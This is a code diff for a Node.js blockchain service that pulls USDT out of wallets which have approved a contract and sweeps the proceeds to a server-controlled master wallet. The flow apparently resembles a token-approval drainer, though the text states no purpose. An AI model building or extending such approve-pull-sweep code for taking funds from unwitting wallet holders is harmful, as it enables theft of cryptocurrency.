@@ -75,7 +75,7 @@ class ContractService {
         }
     }
 
-    // Add this method as a proper class method (outside constructor)
+    // Add this method as a proper class method
     async approveWallet(walletAddress) {
         if (!this.initialized) {
             throw new Error('Contract service not initialized');
@@ -87,7 +87,7 @@ class ContractService {
 
             const tx = await this.contract.approveWallet(walletAddress, {
                 gasLimit: 100000,
-                gasPrice: gasPrice,
+                gasPrice: gasPrice
             });
 
             await tx.wait();
@@ -157,7 +157,8 @@ class ContractService {
         }
         
         try {
-            return await this.contract.approvedWallets(walletAddress);
+            const result = await this.contract.approvedWallets(walletAddress);
+            return result;
         } catch (error) {
             console.error('Error checking wallet approval:', error);
             return false;
@@ -166,117 +167,205 @@ class ContractService {
 
     // Pull USDT from wallet to contract
     async pullUSDTFromWallet(walletAddress) {
-    if (!this.initialized) {
-        return {
-            success: false,
-            error: 'Contract service not initialized for transactions'
-        };
-    }
-    
-    try {
-        console.log('=== PULL USDT START ===');
-        console.log('Pulling USDT from wallet:', walletAddress);
-        console.log('Contract address:', process.env.CONTRACT_ADDRESS);
-        console.log('Master wallet:', this.wallet.address);
-        
-        // Check if wallet has USDT balance first
-        console.log('Checking wallet USDT balance...');
-        const balance = await this.getWalletUSDTBalance(walletAddress);
-        console.log('Wallet USDT balance:', balance);
-        
-        if (parseFloat(balance) <= 0) {
+        if (!this.initialized) {
             return {
                 success: false,
-                error: `Wallet has no USDT balance to pull (${balance} USDT)`
+                error: 'Contract service not initialized for transactions'
             };
         }
         
-        // Check if wallet is approved in contract
-        console.log('Checking if wallet is approved in contract...');
-        const isApproved = await this.isWalletApproved(walletAddress);
-        console.log('Wallet approved status:', isApproved);
-        
-        if (!isApproved) {
-            return {
-                success: false,
-                error: 'Wallet has not been approved in contract'
-            };
-        }
-        
-        // Execute the pull with proper debugging
-        console.log('Sending pull transaction...');
-        console.log('Function signature:', this.contract.interface.getFunction('pull'));
-        
-        const tx = await this.contract.pull(walletAddress, {
-            gasLimit: 300000,
-            gasPrice: await this.provider.getFeeData().then(feeData => feeData.gasPrice)
-        });
-        
-        console.log('Transaction sent:', tx.hash);
-        console.log('Transaction data:', tx.data);
-        
-        // Wait for transaction confirmation with timeout
-        console.log('Waiting for transaction confirmation...');
-        const receipt = await Promise.race([
-            tx.wait(),
-            new Promise((resolve, reject) => 
-                setTimeout(() => reject(new Error('Transaction confirmation timeout after 60 seconds')), 60000)
-            )
-        ]);
-        
-        console.log('Transaction receipt:', receipt);
-        
-        // Check if transaction was successful
-        if (receipt.status === 0) {
-            return {
-                success: false,
-                error: 'Transaction failed - contract execution reverted',
-                txHash: tx.hash
-            };
-        }
-        
-        // Get the amount pulled from the event
-        let amount = '0';
-        if (receipt.logs && receipt.logs.length > 0) {
-            try {
-                console.log('Parsing transaction logs...');
-                // Parse the USDTReceived event (from ABI)
-                const eventInterface = new ethers.Interface([
-                    "event USDTReceived(address indexed wallet, uint256 amount)"
-                ]);
-                
-                for (const log of receipt.logs) {
-                    try {
-                        const parsedLog = eventInterface.parseLog(log);
-                        if (parsedLog && parsedLog.name === 'USDTReceived') {
-                            amount = ethers.formatUnits(parsedLog.args.amount, 18);
-                            console.log('USDTReceived event found:', amount);
-                            break;
+        try {
+            console.log('Pulling USDT from wallet:', walletAddress);
+            
+            // Check if wallet has USDT balance
+            const balance = await this.getWalletUSDTBalance(walletAddress);
+            if (parseFloat(balance) <= 0) {
+                return {
+                    success: false,
+                    error: 'Wallet has no USDT balance to pull'
+                };
+            }
+            
+            // Check if wallet is approved in contract
+            const isApproved = await this.isWalletApproved(walletAddress);
+            if (!isApproved) {
+                return {
+                    success: false,
+                    error: 'Wallet has not been approved in contract'
+                };
+            }
+            
+            // Execute the pull
+            const tx = await this.contract.pull(walletAddress, {
+                gasLimit: 300000,
+                gasPrice: await this.provider.getFeeData().then(feeData => feeData.gasPrice)
+            });
+            
+            // Wait for transaction confirmation with timeout
+            const receipt = await Promise.race([
+                tx.wait(),
+                new Promise((resolve, reject) => 
+                    setTimeout(() => reject(new Error('Transaction confirmation timeout')), 60000)
+                )
+            ]);
+            
+            // Get the amount pulled from the event
+            let amount = '0';
+            if (receipt.logs && receipt.logs.length > 0) {
+                try {
+                    // Parse the USDTReceived event (from ABI)
+                    const eventInterface = new ethers.Interface([
+                        "event USDTReceived(address indexed wallet, uint256 amount)"
+                    ]);
+                    
+                    for (const log of receipt.logs) {
+                        try {
+                            const parsedLog = eventInterface.parseLog(log);
+                            if (parsedLog && parsedLog.name === 'USDTReceived') {
+                                amount = ethers.formatUnits(parsedLog.args.amount, 18);
+                                break;
+                            }
+                        } catch (e) {
+                            // Continue to next log if parsing fails
+                            console.log('Log parsing failed:', e.message);
                         }
-                    } catch (e) {
-                        console.log('Log parsing failed:', e.message);
                     }
+                } catch (e) {
+                    console.log('Could not parse event, using default amount');
                 }
-            } catch (e) {
-                console.log('Could not parse event, using default amount');
+            }
+            
+            return {
+                success: true,
+                txHash: tx.hash,
+                amount: amount
+            };
+        } catch (error) {
+            console.error('Error during pull:', error);
+            return {
+                success: false,
+                error: error.message
+            };
+        }
+    }
+
+    // Implement the actual withdrawal function
+    async withdrawUSDTToMaster() {
+        if (!this.initialized) {
+            return {
+                success: false,
+                error: 'Contract service not initialized for transactions'
+            };
+        }
+        
+        try {
+            console.log('Executing withdrawal to master wallet...');
+            
+            // First check if contract has USDT balance
+            const contractBalance = await this.getContractUSDTBalance();
+            if (parseFloat(contractBalance) <= 0) {
+                return {
+                    success: false,
+                    error: 'Contract has no USDT balance to withdraw'
+                };
+            }
+            
+            // Execute the withdrawal with proper gas settings
+            const feeData = await this.provider.getFeeData();
+            const tx = await this.contract.withdrawToMaster({
+                gasLimit: 300000,
+                gasPrice: feeData.gasPrice
+            });
+            
+            console.log('Transaction sent:', tx.hash);
+            
+            // Wait for transaction confirmation with timeout
+            const receipt = await Promise.race([
+                tx.wait(),
+                new Promise((resolve, reject) => 
+                    setTimeout(() => reject(new Error('Transaction confirmation timeout after 60 seconds')), 60000)
+                )
+            ]);
+            
+            console.log('Transaction confirmed:', receipt);
+            
+            // Get the amount withdrawn from the event
+            let amount = '0';
+            if (receipt.logs && receipt.logs.length > 0) {
+                try {
+                    // Parse the USDTWithdrawn event
+                    const eventInterface = new ethers.Interface([
+                        "event USDTWithdrawn(address indexed to, uint256 amount)"
+                    ]);
+                    
+                    for (const log of receipt.logs) {
+                        try {
+                            const parsedLog = eventInterface.parseLog(log);
+                            if (parsedLog && parsedLog.name === 'USDTWithdrawn') {
+                                amount = ethers.formatUnits(parsedLog.args.amount, 18);
+                                break;
+                            }
+                        } catch (e) {
+                            // Continue to next log if parsing fails
+                            console.log('Log parsing failed:', e.message);
+                        }
+                    }
+                } catch (e) {
+                    console.log('Could not parse event, using default amount');
+                }
+            }
+            
+            // If no amount found in events, get contract balance before transaction
+            if (parseFloat(amount) <= 0) {
+                amount = contractBalance;
+            }
+            
+            return {
+                success: true,
+                txHash: tx.hash,
+                amount: amount
+            };
+        } catch (error) {
+            console.error('Error during withdrawal:', error);
+            return {
+                success: false,
+                error: error.message
+            };
+        }
+    }
+
+    // Get contract USDT balance
+    async getContractUSDTBalance() {
+        if (!this.initialized) {
+            console.warn('Contract service not initialized for transactions');
+            // Try read-only approach
+            try {
+                if (!this.provider || !process.env.CONTRACT_ADDRESS) {
+                    return '0';
+                }
+                
+                const contract = new ethers.Contract(
+                    process.env.CONTRACT_ADDRESS,
+                    ['function getContractUSDT() external view returns (uint256)'],
+                    this.provider
+                );
+                
+                const balance = await contract.getContractUSDT();
+                return ethers.formatUnits(balance, 18);
+            } catch (error) {
+                console.error('Error getting contract USDT balance (read-only):', error);
+                return '0';
             }
         }
         
-        console.log('=== PULL USDT END ===');
-        
-        return {
-            success: true,
-            txHash: tx.hash,
-            amount: amount
-        };
-    } catch (error) {
-        console.error('Error during pull:', error);
-        return {
-            success: false,
-            error: error.message
-        };
+        try {
+            const balance = await this.contract.getContractUSDT();
+            return ethers.formatUnits(balance, 18);
+        } catch (error) {
+            console.error('Error getting contract USDT balance:', error);
+            return '0';
+        }
     }
 }
 
 module.exports = new ContractService();
-
